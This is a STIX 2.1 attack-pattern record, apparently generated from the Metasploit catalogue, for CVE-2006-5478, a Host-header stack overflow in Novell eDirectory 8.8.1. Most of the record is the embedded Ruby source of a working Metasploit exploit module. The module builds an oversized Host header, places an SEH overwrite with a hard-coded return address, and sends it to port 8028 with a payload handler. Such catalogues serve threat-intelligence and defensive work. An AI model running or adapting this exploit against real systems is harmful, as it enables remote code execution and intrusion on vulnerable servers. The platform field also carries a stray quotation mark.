{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a52526a-a444-40cc-bc4a-fdb629c58202",
    "created": "2024-08-14T16:54:44.208815Z",
    "modified": "2024-08-14T16:54:44.208819Z",
    "name": "Novell eDirectory NDS Server Host Header Overflow",
    "description": " This module exploits a stack buffer overflow in Novell eDirectory 8.8.1. The web interface does not validate the length of the HTTP Host header prior to using the value of that header in an HTTP redirect. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/edirectory_host.rb",
            "external_id": "edirectory_host.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5478"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell eDirectory NDS Server Host Header Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Novell eDirectory 8.8.1.\n        The web interface does not validate the length of the\n        HTTP Host header prior to using the value of that header in an\n        HTTP redirect.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-5478'],\n          ['OSVDB', '29993'],\n          ['BID', '20655'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Novell eDirectory 8.8.1', { 'Ret' => 0x10085bee } ], # ntls.dll\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2006-10-21',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(8028)])\n  end\n\n  def exploit\n    connect\n\n    sploit =  \"GET /nds HTTP/1.1\" + \"\\r\\n\"\n    sploit << \"Host: \" + rand_text_alphanumeric(9, payload_badchars)\n    sploit << \",\" + rand_text_alphanumeric(719, payload_badchars)\n    seh    = generate_seh_payload(target.ret)\n    sploit[705, seh.length] = seh\n    sploit << \"\\r\\n\\r\\n\"\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-10-21",
    "x_mitre_platforms": [
        "win'"
    ]
}